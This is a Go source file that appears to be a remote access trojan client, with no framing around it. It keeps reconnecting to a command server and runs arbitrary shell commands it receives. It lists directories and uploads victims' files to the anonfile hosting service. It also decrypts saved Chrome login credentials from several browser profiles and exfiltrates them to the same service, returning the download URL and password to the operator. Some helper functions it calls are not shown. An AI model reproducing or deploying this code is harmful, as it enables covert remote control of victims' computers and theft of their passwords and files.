package main

import (
	"encoding/json"
	"github.com/charmbracelet/log"
	_ "github.com/mattn/go-sqlite3"
	"github.com/wabarc/go-anonfile"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

func main() {
	var host = "localhost"
	var port = 2137

	for {
		serverConn, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
		if err != nil {
			log.Errorf("Failed to connect to server: %v", err)
			// Wait for a while before reconnecting
			time.Sleep(time.Second * 5)
			continue
		}

		log.Infof("Connected to server %s:%d", host, port)

		// receive data from server
		buffer := make([]byte, 1024)
		for {
			bytesRead, err := serverConn.Read(buffer)
			if err != nil {
				log.Errorf("Failed to receive data from server: %v", err)
				_ = serverConn.Close()
				break
			}

			data := buffer[:bytesRead]
			log.Infof("Received data: %s", data)

			s := string(data)

			ParseCommands(s, serverConn)
		}

		log.Warnf("Server closed the connection. Reconnecting...")
	}
}

func ParseCommands(input string, conn net.Conn) {
	if strings.HasPrefix(input, "cmd") {
		args := ParseArgs(input, "cmd")
		command := exec.Command(args[0], args[1:]...)

		output, err := command.Output()
		if err != nil {
			SendResponse(conn, "Failed to execute command: "+err.Error())
		}

		outputString := strings.TrimSpace(string(output))
		SendResponse(conn, outputString)
	} else if strings.HasPrefix(input, "files") {
		args := ParseArgs(input, "files")

		// string builder
		var sb strings.Builder
		sb.WriteString("Received files: \n")

		dir, err := os.ReadDir(strings.Join(args, " "))
		if err != nil {
			SendResponse(conn, "Failed to read directory: "+err.Error())
			return
		}

		for _, file := range dir {
			sb.WriteString("Name: " + strings.Join(args, " ") + file.Name() + ", IsFile: " + strconv.FormatBool(!file.IsDir()) + "\n")
		}

		SendResponse(conn, strings.TrimRight(sb.String(), "\n"))
	} else if strings.HasPrefix(input, "download") {
		args := ParseArgs(input, "download")
		originalFile := args[0]

		var split []string
		if strings.Contains(originalFile, "/") {
			split = strings.Split(originalFile, "/")
		} else {
			split = strings.Split(originalFile, "\\")
		}

		tempFile := CreateTempFile(split[len(split)-1])
		CopyFile(originalFile, tempFile)

		file := UploadFile(tempFile.Name())
		CloseFile(tempFile)
		_ = os.Remove(tempFile.Name())

		SendResponse(conn, file)
	} else if strings.HasPrefix(input, "decrypt") {
		args := ParseArgs(input, "decrypt")
		_ = args[0] // TODO

		localStatePath := os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
		defaultChromePath := os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data"

		localState, stateDirPath := CreateTempAndCopyFile(localStatePath)

		var profiles []string
		if CheckFileExist(defaultChromePath + "\\Default") {
			profiles = append(profiles, "Default")
		}

		for i := 1; i < 6; i++ {
			if CheckFileExist(defaultChromePath + "\\Profile " + strconv.Itoa(i)) {
				profiles = append(profiles, "Profile "+strconv.Itoa(i))
			}
		}

		data := DecryptLoginData(profiles, localState)

		_ = os.Remove(localState)
		_ = os.Remove(stateDirPath)

		marshal, _ := json.Marshal(data)
		password := RandomString(32)
		encryptData, _ := EncryptData(marshal, password)

		file := CreateTempFile("LoginData")
		_, err := file.Write(encryptData)
		if err != nil {
			log.Errorf("Failed to write encrypted data to file: %v", err)
		}

		uploadFile := UploadFile(file.Name())

		CloseFile(file)
		_ = os.Remove(file.Name())

		SendResponse(conn, "Decrypted login data from chrome\nPassword: "+password+"\nURL: "+uploadFile)
	}
}

func UploadFile(pathToFile string) string {
	var content = ""
	if data, err := anonfile.NewAnonfile(nil).Upload(pathToFile); err == nil {
		content = data.Data.File.URL.Full
	}

	return content
}

func ParseArgs(input string, command string) []string {
	args := strings.Split(input, command+" ")
	args = args[1:]
	return args
}

func SendResponse(conn net.Conn, response string) {
	_, err := conn.Write([]byte(response))
	if err != nil {
		log.Errorf("Failed to send response to client: %v", err)
	}
}
